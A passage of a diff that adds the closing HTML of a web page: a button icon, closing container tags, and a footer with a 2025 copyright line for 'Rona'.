+                            <span class="button__icon">→</span>
+                        </a>
+                    </span>
+                </div>
+        </div>
+    
+</div>
+
+    </div>
+
+    
+    <footer class="footer">
+        <div class="footer__inner">
+                <div class="copyright copyright--user">&#169 2025 Rona 🐈</div>
+            </div>
+    </footer>
+    
+
+</div>
+</body>
+
+</html>
